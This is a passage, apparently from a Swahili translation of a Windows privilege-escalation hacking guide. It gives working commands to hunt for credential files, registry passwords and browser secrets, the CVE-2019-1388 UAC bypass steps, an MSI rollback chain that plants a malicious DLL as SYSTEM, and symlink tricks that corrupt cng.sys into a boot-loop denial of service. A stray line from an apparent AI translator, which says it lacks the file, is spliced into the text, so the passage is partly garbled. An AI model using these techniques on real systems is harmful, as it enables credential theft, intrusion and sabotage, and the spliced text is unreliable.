%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
I don't have the file contents. Please paste the content of src/windows-hardening/windows-local-privilege-escalation/README.md (or the list of proposed files) you want searched/translated. Once you provide them I'll translate the English text to Swahili, preserving all markdown/HTML/tags/paths exactly as requested.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials in the RecycleBin

Unapaswa pia kuangalia Bin kutafuta credentials ndani yake

Ili **recover passwords** zilizohifadhiwa na programu kadhaa unaweza kutumia: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Ndani ya registry

**Registry keys nyingine zinazoweza kuwa na credentials**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia ya Vivinjari

Unapaswa kuangalia dbs ambapo nywila kutoka kwa **Chrome or Firefox** zimehifadhiwa.\
Pia angalia historia, alama za ukurasa na vipendwa vya vivinjari kwani labda baadhi ya **nywila zimetunzwa** huko.

Zana za kutoa nywila kutoka kwa vivinjari:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

Component Object Model (COM) ni teknolojia iliyojengwa ndani ya mfumo wa uendeshaji wa Windows inayoruhusu mawasiliano kati ya vipengele vya programu vilivyoandikwa kwa lugha mbalimbali. Kila sehemu ya COM inatambulika kwa class ID (CLSID) na kila sehemu inaonyesha utendakazi kupitia moja au zaidi ya interfaces, zinazotambulika kwa interface IDs (IIDs).

COM classes and interfaces are defined in the registry under **HKEY\CLASSES\ROOT\CLSID** and **HKEY\CLASSES\ROOT\Interface** respectively. This registry is created by merging the **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Ndani ya CLSIDs za rejista hii unaweza kupata rejista ya mtoto **InProcServer32** ambayo ina **default value** inayorejelea DLL na thamani iitwayo **ThreadingModel** ambayo inaweza kuwa **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) au **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Kwa msingi, ikiwa unaweza overwrite yoyote ya DLLs zitakazotekelezwa, unaweza escalate privileges ikiwa DLL hiyo itatekelezwa na mtumiaji mwingine.

Ili kujifunza jinsi attackers wanavyotumia COM Hijacking kama mechanism ya persistence angalia:


{{#ref}}
com-hijacking.md
{{#endref}}

### Utafutaji wa Nywila kwa Jumla katika faili na rejista

**Tafuta yaliyomo kwenye faili**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Tafuta faili yenye jina fulani**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Tafuta registry kwa key names na passwords**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Zana zinazotafuta passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin ni plugin ya msf niliyoitengeneza ili **automatically execute every metasploit POST module that searches for credentials** ndani ya victim.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) huatafuta kwa otomatiki faili zote zenye passwords zilizotajwa kwenye ukurasa huu.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ni zana nyingine nzuri ya kutoa password kutoka kwenye mfumo.

Zana [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) inatafuta **sessions**, **usernames** na **passwords** za zana kadhaa zinazohifadhi data hii kwa clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Fikiria mchakato unaokimbia kama SYSTEM unafungua mchakato mpya (`OpenProcess()`) na kupata **ufikiaji kamili**. Mchakato uleule pia huunda mchakato mpya (`CreateProcess()`) **wenye idhini ndogo lakini urithi wa handles zote zilizo wazi za mchakato mkuu**.\
Kisha, ikiwa una **ufikiaji kamili kwa mchakato wenye idhini ndogo**, unaweza kupata **handle iliyofunguliwa ya mchakato lenye idhini** iliyoundwa kwa `OpenProcess()` na **kuingiza shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Segments za kumbukumbu zinazoshirikiwa, zinazoitwa **pipes**, zinawezesha mawasiliano ya michakato na uhamishaji wa data.

Windows inatoa kipengele kinachoitwa **Named Pipes**, kinachowawezesha michakato isiyohusiana kushiriki data, hata kwenye mitandao tofauti. Hii ni sawa na usanifu wa client/server, ambapo majukumu yamewekwa kama **named pipe server** na **named pipe client**.

Wakati data inapotumwa kupitia pipe na client, server aliyesanidi pipe ana uwezo wa kuchukua utambulisho wa client, mradi kama ana haki za SeImpersonate zinazohitajika. Kuutambua mchakato mwenye idhini (privileged) unaozungumza kupitia pipe unayoweza kuiga kunatoa fursa ya kupata idhini za juu kwa kubeba utambulisho wa mchakato huo mara itakaposhirikiana na pipe uliyoanzisha. Kwa maelekezo ya jinsi ya kufanikisha shambulio kama hilo, mwongozo mzuri unapatikana [**here**](named-pipe-client-impersonation.md) na [**here**](#from-high-integrity-to-system).

Vivyo hivyo zana zifuatazo zinawezesha kuingilia mawasiliano ya named pipe kwa zana kama burp: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) na zana hii inaruhusu kuorodhesha na kuona pipes zote ili kutafuta privescs [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Huduma ya Telephony (TapiSrv) katika mode ya server inaonyesha `\\pipe\\tapsrv` (MS-TRP). Mteja wa mbali aliyeathibitishwa anaweza kuabusu njia ya matukio ya async inayotegemea mailslot ili kubadilisha `ClientAttach` kuwa uandishi wa 4-byte wa hiari kwa faili yoyote iliyopo inayoweza kuandikwa na `NETWORK SERVICE`, kisha kupata haki za admin za Telephony na kupakia DLL yoyote kama huduma. Mtiririko kamili:

- `ClientAttach` ikiwa `pszDomainUser` imewekwa kwenye njia iliyopo inayoweza kuandikwa → huduma hufungua kupitia `CreateFileW(..., OPEN_EXISTING)` na kuitumia kwa uandishi wa matukio ya async.
- Kila tukio linaandika `InitContext` inayodhibitiwa na mshambuliaji kutoka `Initialize` kwa handle hiyo. Sajili app ya line kwa `LRegisterRequestRecipient` (`Req_Func 61`), chochea `TRequestMakeCall` (`Req_Func 121`), chukua kupitia `GetAsyncEvents` (`Req_Func 0`), kisha uondoke/uzima ili kurudia uandishi wa kisahihi.
- Jiweke kwenye `[TapiAdministrators]` katika `C:\Windows\TAPI\tsec.ini`, ungana tena, kisha piga `GetUIDllName` na njia yoyote ya DLL ili kutekeleza `TSPI_providerUIIdentify` kama `NETWORK SERVICE`.

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Mengine

### File Extensions that could execute stuff in Windows

Angalia ukurasa **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Viungo vya Markdown vinavyoweza kubonyezwa vinavyotumwa kwa `ShellExecuteExW` vinaweza kuchochea URI handlers hatari (`file:`, `ms-appinstaller:` au mfumo wowote uliosajiliwa) na kutekeleza faili zinazodhibitiwa na mshambuliaji kama mtumiaji wa sasa. Angalia:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Ufuatiliaji wa Command Lines kwa nywila**

Wakati unapata shell kama mtumiaji, kunaweza kuwa na kazi zilizopangwa au michakato mingine inayotekelezwa ambayo hupitisha cheti (credentials) kwenye command line. Skripti hapa chini inakamata command lines za mchakato kila sekunde mbili na kulinganisha hali ya sasa na ile ya awali, ikitoa tofauti yoyote.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Kuiba nywila kutoka kwa michakato

## Kutoka kwa Mtumiaji wa vibali vya chini hadi NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ikiwa una ufikiaji wa kiolesura cha picha (kupitia console au RDP) na UAC imewezeshwa, katika baadhi ya matoleo ya Microsoft Windows inawezekana kuendesha terminal au mchakato mwingine wowote kama "NT\AUTHORITY SYSTEM" kutoka kwa mtumiaji asiye na vibali.

Hii inafanya iwezekane kuongeza vibali na kupitisha UAC kwa wakati mmoja kwa udhaifu uleule. Zaidi ya hayo, hakuna haja ya kusanidi chochote na binary inayotumika wakati wa mchakato huo, imewekwa saini na kutolewa na Microsoft.

Baadhi ya mifumo iliyoathirika ni zifuatazo:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Ili ku-exploit vulnerability hii, ni lazima ufanye hatua zifuatazo:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Soma hii ili **ujifunze kuhusu Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Kisha **soma hii ili ujifunze kuhusu UAC na UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

Mbinu iliyotajwa [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) pamoja na exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Shambulio hili kinajumuisha kuudhiisha rollback feature ya Windows Installer kubadilisha faili halali na zilizoharibika wakati wa mchakato wa uninstallation. Kwa hili mshambuliaji anahitaji kuunda **malicious MSI installer** ambayo itatumika ku-hijack folda ya `C:\Config.Msi`, ambayo baadaye Windows Installer itatumia kuhifadhi rollback files wakati wa uninstallation ya vifurushi vingine vya MSI ambapo rollback files zingeweza kuwa zimebadilishwa kuwa na payload ya uharibifu.

Mbinu kwa ufupi ni kama ifuatavyo:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Tengeneza `.msi` inayosakinisha faili isiyo hatari (mfano, `dummy.txt`) katika folda inayoweza kuandikwa (`TARGETDIR`).
- Alama installer kama **"UAC Compliant"**, ili **non-admin user** aweze kuendesha.
- Weka **handle** wazi kwa faili baada ya kusakinisha.

- Step 2: Begin Uninstall
- Uninstall `.msi` ile ile.
- Mchakato wa uninstall unaanza kusogeza faili kwenye `C:\Config.Msi` na kuzipa majina mapya kuwa `.rbf` files (rollback backups).
- **Poll the open file handle** kwa kutumia `GetFinalPathNameByHandle` ili kugundua wakati faili inapotokea kuwa `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- `.msi` ina **custom uninstall action (`SyncOnRbfWritten`)** ambayo:
- Inaonyesha wakati `.rbf` imeandikwa.
- Kisha **inasubiri** tukio lingine kabla ya kuendelea na uninstall.

- Step 4: Block Deletion of `.rbf`
- Wakati imetumwa ishara, **fungua faili `.rbf`** bila `FILE_SHARE_DELETE` — hii **inazuia kuifuta**.
- Kisha **tuma ishara** ili uninstall iendelee.
- Windows Installer haitafanikiwa kufuta `.rbf`, na kwa sababu haiwezi kufuta yaliyomo yote, **`C:\Config.Msi` is not removed**.

- Step 5: Manually Delete `.rbf`
- Wewe (mshambuliaji) unafuta faili ya `.rbf` kwa mkono.
- Sasa **`C:\Config.Msi` ni tupu**, tayari kuibiwa.

> Katika hatua hii, **anzisha SYSTEM-level arbitrary folder delete vulnerability** ili kufuta `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Unda tena folda ya `C:\Config.Msi` wewe mwenyewe.
- Weka **weak DACLs** (mfano, Everyone:F), na **weka handle wazi** yenye `WRITE_DAC`.

- Step 7: Run Another Install
- Sakinisha `.msi` tena, kwa:
- `TARGETDIR`: Mahali kinachoweza kuandikwa.
- `ERROROUT`: Variable inayochochea kushindwa kwa nguvu.
- Sakinishaji hili litatumika kusababisha **rollback** tena, ambayo inasoma `.rbs` na `.rbf`.

- Step 8: Monitor for `.rbs`
- Tumia `ReadDirectoryChangesW` kufuatilia `C:\Config.Msi` mpaka `.rbs` mpya itaonekana.
- Chukua jina lake la faili.

- Step 9: Sync Before Rollback
- `.msi` ina **custom install action (`SyncBeforeRollback`)** ambayo:
- Inatuma ishara tukio linapotokea `.rbs` imeundwa.
- Kisha **inasubiri** kabla ya kuendelea.

- Step 10: Reapply Weak ACL
- Baada ya kupokea tukio la `.rbs created`:
- Windows Installer **reapplies strong ACLs** kwa `C:\Config.Msi`.
- Lakini kwa kuwa bado una handle yenye `WRITE_DAC`, unaweza tena **kuweka weak ACLs** tena.

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Funika faili ya `.rbs` na rollback script bandia inayoelekeza Windows:
- Kurejesha `.rbf` yako (malicious DLL) kwenye eneo la mwenye sifa (mfano, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Kuacha `.rbf` bandia inayoibeba **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Tuma ishara ya sync ili installer iendelee.
- A **type 19 custom action (`ErrorOut`)** imesanifiwa kusababisha kusakinisha kushindwa kukusudiwa katika hatua inayojulikana.
- Hii inasababisha **rollback kuanza**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Inasoma `.rbs` yako ya uharibifu.
- Inakopa `.rbf` yako DLL katika eneo lengwa.
- Sasa una **malicious DLL katika njia inayopakiwa na SYSTEM**.

- Final Step: Execute SYSTEM Code
- Endesha binary ya kuaminika yenye auto-elevation (mfano, `osk.exe`) ambayo inaload DLL uliyohijack.
- **Boom**: Msimamo wako unatekelezwa **kama SYSTEM**.

### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

Mbinu kuu ya MSI rollback (ile iliyotajwa hapo juu) inadhani unaweza kufuta **folder nzima** (mfano, `C:\Config.Msi`). Lakini vipi ikiwa udhaifu wako unaruhusu tu **arbitrary file deletion**?

Unaweza kutumia **NTFS internals**: kila folda ina hidden alternate data stream called:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Mtiririko huu huhifadhi **index metadata** ya folda.

Hivyo, ikiwa uta **delete the `::$INDEX_ALLOCATION` stream** ya folda, NTFS **inaondoa folda yote** kutoka kwenye mfumo wa faili.

Unaweza kufanya hivi kwa kutumia APIs za kawaida za kufuta faili kama:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Ingawa unaitisha API ya kufuta *file*, inafuta **the folder itself**.

### From Folder Contents Delete to SYSTEM EoP
Je, vipi ikiwa primitive yako haiwezi kukuruhusu kufuta arbitrary files/folders, lakini **inaruhusu kufuta the *contents* of an attacker-controlled folder**?

1. Step 1: Tengeneza bait folder na file
- Create: `C:\temp\folder1`
- Inside it: `C:\temp\folder1\file1.txt`

2. Step 2: Place an **oplock** on `file1.txt`
- Oplock **inasimamisha utekelezaji** wakati mchakato wenye ruhusa za juu unajaribu kufuta `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Hatua 3: Chochea mchakato wa SYSTEM (kwa mfano, `SilentCleanup`)
- Mchakato huu hupitia folda (mfano, `%TEMP%`) na kujaribu kufuta yaliyomo ndani yao.
- Inapofika kwenye `file1.txt`, the **oplock triggers** na inampa callback yako udhibiti.

4. Hatua 4: Ndani ya callback ya oplock – elekeza ufutaji

- Chaguo A: Hamisha `file1.txt` mahali pengine
- Hii inafanya `folder1` kuwa tupu bila kuvunja oplock.
- Usifute `file1.txt` moja kwa moja — hilo litaachilia oplock mapema.

- Chaguo B: Geuza `folder1` kuwa **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Chaguo C: Tengeneza **symlink** katika `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Hii inalenga stream ya ndani ya NTFS inayohifadhi metadata ya folda — kuifuta kunaifuta folda.

5. Hatua 5: Kuachilia oplock
- Mchakato wa SYSTEM unaendelea na unajaribu kufuta `file1.txt`.
- Lakini sasa, kutokana na junction + symlink, kwa kweli inaifuta:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Matokeo**: `C:\Config.Msi` imefutwa na SYSTEM.

### Kutoka Arbitrary Folder Create hadi Permanent DoS

Tumia primitive inayokuruhusu **create an arbitrary folder as SYSTEM/admin** — hata kama **huwezi kuandika faili** au **kuweka ruhusa dhaifu**.

Unda **saraka** (sio faili) yenye jina la **critical Windows driver**, kwa mfano:
```
C:\Windows\System32\cng.sys
```
- Njia hii kwa kawaida inaashiria `cng.sys` kernel-mode driver.
- Ikiwa **kuunda mapema kama folda**, Windows inashindwa kupakia dereva halisi wakati wa uzinduzi.
- Kisha, Windows inajaribu kupakia `cng.sys` wakati wa uzinduzi.
- Inaona folda, **inashindwa kutatua dereva halisi**, na **inaanguka au kusimamisha uzinduzi**.
- Hakuna **njia mbadala**, na **hakuna ukarabati** bila kuingilia nje (mf., ukarabati wa boot au upatikanaji wa diski).

### Kutoka kwenye njia za log/backup zilizo na ruhusa za juu + OM symlinks hadi kuandika upya faili kwa hiari / boot DoS

Wakati **huduma yenye ruhusa za juu** inaandika logs/exports kwenye njia inayosomwa kutoka kwa **config inayoweza kuandikwa**, elekeza tena njia hiyo kwa kutumia **Object Manager symlinks + NTFS mount points** ili kubadilisha uandishi wa huduma hiyo kuwa kuandika upya faili kwa hiari (hata **bila** SeCreateSymbolicLinkPrivilege).

**Mahitaji**
- Config inayohifadhi njia ya lengo inaweza kuandikwa na mshambuliaji (mf., `%ProgramData%\...\.ini`).
- Uwezo wa kuunda mount point kwa `\RPC Control` na OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Operesheni yenye ruhusa za juu inayoiandika kwenye njia hiyo (log, export, report).

**Mfano wa mnyororo**
1. Soma config ili kupata mahali pa log la huduma yenye ruhusa za juu, mf., `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` katika `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Elekeza tena njia bila admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Subiri sehemu yenye ruhusa kuandika log (kwa mfano, admin anasababisha "send test SMS"). Uandishi sasa unaingia `C:\Windows\System32\cng.sys`.
4. Chunguza lengo lililobadilishwa (hex/PE parser) kuthibitisha uharibifu; kuwasha upya kunalazimisha Windows kupakia njia ya driver iliyodanganywa → **boot loop DoS**. Hii pia inatumika kwa faili yoyote lililolindwa ambalo service yenye ruhusa itafungua kwa kuandika.

> `cng.sys` kawaida hupakiwa kutoka `C:\Windows\System32\drivers\cng.sys`, lakini ikiwa kuna nakala katika `C:\Windows\System32\cng.sys` inaweza kujaribiwa kwanza, ikifanya iwe sinki thabiti la DoS kwa data iliyoharibika.



## **Kutoka High Integrity hadi System**

### **Huduma mpya**

Ikiwa tayari unafanya kazi kwenye mchakato wa High Integrity, **njia hadi SYSTEM** inaweza kuwa rahisi kwa **kuunda na kuendesha huduma mpya**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Unapounda service binary hakikisha ni service halali au kwamba binary inafanya vitendo vinavyohitajika haraka kwa sababu itauawa ndani ya 20s ikiwa si service halali.

### AlwaysInstallElevated

Kutoka katika mchakato wa High Integrity unaweza kujaribu **kuwezesha AlwaysInstallElevated registry entries** na **kusakinisha** reverse shell kwa kutumia wrapper ya _**.msi**_.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**You can** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Ikiwa una token privileges hizo (huenda utazipata katika mchakato ulio tayari kuwa High Integrity), utaweza **kufungua karibu mchakato wowote** (si mchakato uliolindwa) kwa kutumia SeDebug privilege, **kunakili token** ya mchakato, na kuunda **mchakato wowote ukiwa na token hiyo**.\
Kutumia mbinu hii kawaida huhitajika **kuchagua mchakato wowote unaoendesha kama SYSTEM wenye token privileges zote** (_ndio, unaweza kupata SYSTEM processes zisizo na token privileges zote_).\
**Unaweza kupata** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Teknolojia hii inatumiwa na meterpreter kuongezeka kwa ruhusa katika `getsystem`. Mbinu hiyo inajumuisha **kuunda pipe na kisha kuunda/abusu service ili kuandika kwenye pipe hiyo**. Kisha, **server** iliyounda pipe kwa kutumia **`SeImpersonate`** privilege itakuwa na uwezo wa **kuiga token** ya client wa pipe (service) na kupata ruhusa za SYSTEM.\
Ikiwa unataka [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
Ikiwa unataka kusoma mfano wa [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ukifanikiwa **kuhijack a dll** inayopakiwa na **mchakato** unaoendesha kama **SYSTEM** utaweza kutekeleza arbitrary code kwa ruhusa hizo. Kwa hivyo Dll Hijacking pia ni muhimu kwa aina hii ya privilege escalation, na zaidi, ni **rahisi zaidi kufikiwa kutoka mchakato wa high integrity** kwani itakuwa na **write permissions** kwenye folda zinazotumika kupakia dlls.\
**Unaweza** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Msaada zaidi

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Zana muhimu

**Zana bora ya kutafuta Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Angalia misconfigurations na mafaili nyeti (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Imegunduliwa.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Angalia baadhi ya misconfigurations zinazowezekana na ukusanye taarifa (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Angalia misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Inatoa taarifa za vikao vilivyohifadhiwa vya PuTTY, WinSCP, SuperPuTTY, FileZilla, na RDP. Tumia -Thorough kwa local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Inachota credentials kutoka Credential Manager. Imegunduliwa.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Inafanya password spraying kwa domain kwa kutumia nywila zilizokusanywa**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ni PowerShell ADIDNS/LLMNR/mDNS spoofer na zana ya man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Uchunguzi wa msingi wa privesc Windows**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Tafuta privesc vulnerabilities zinazojulikana (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Tafuta privesc vulnerabilities zinazojulikana (inahitaji kucompiled kwa kutumia VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Huorodhesha host ikitafuta misconfigurations (ni zana zaidi ya kukusanya taarifa kuliko privesc) (inahitaji kucompiled) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Inachota credentials kutoka programu nyingi (precompiled exe in github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port ya PowerUp kwa C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Angalia misconfiguration (executable precompiled in github). Haipendekezwi. Haifanyi kazi vizuri kwenye Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Angalia misconfigurations zinazowezekana (exe kutoka python). Haipendekezwi. Haifanyi kazi vizuri kwenye Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Zana iliyoundwa kulingana na chapisho hili (haihitaji accesschk ili ifanye kazi vizuri lakini inaweza kuitumia).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Inasoma matokeo ya **systeminfo** na kupendekeza exploits zinazofanya kazi (python ya local)\
